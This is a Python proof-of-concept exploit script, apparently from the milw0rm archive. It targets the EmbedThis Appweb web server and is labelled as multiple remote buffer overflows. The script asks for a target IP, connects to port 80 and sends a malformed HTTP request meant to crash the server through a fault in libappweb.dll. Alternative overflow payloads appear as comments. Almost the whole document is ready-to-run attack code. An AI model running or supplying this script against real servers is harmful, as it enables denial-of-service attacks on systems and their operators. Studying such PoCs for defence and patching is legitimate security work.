#!/usr/bin/python
############################################################################
# 
# EmbedThis Appweb v3.0B.2-4 Multiple Remote Buffer Overflow PoCs
# Found By: Dr_IDE
# Based On: http://www.milw0rm.com/exploits/9411
# Tested On: XP SP2
# Notes: These don't seem to actually take down the server, they cause
# a fault in libappweb.dll.
#
############################################################################

from socket import *

# Seems like the server really doesn't like talking to us...
# Anything you send seems to elicit the same crash from the server.

#payload = ("\x41" * 10000 + " HTTP/1.1\r\n\r\n")
#payload = "HEAD HTTP/1.1\r\n\r\n"
#payload = "GET HTTP/1.1\r\n\r\n"
#payload = "GET \r\n\r\n"
#payload = "HEAD \r\n\r\n"
payload = "\r\n\r\n"

ip = raw_input(" [*] Enter the target IP: ")
s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, 80))

print " [*] Connecting to Target."
s.send(payload)
print " [*] Sending \"payload\"..."
print " [*] Crash will pop up in a few seconds."
s.close()
raw_input(" [*] Done, press enter to quit")

# milw0rm.com [2009-08-13]
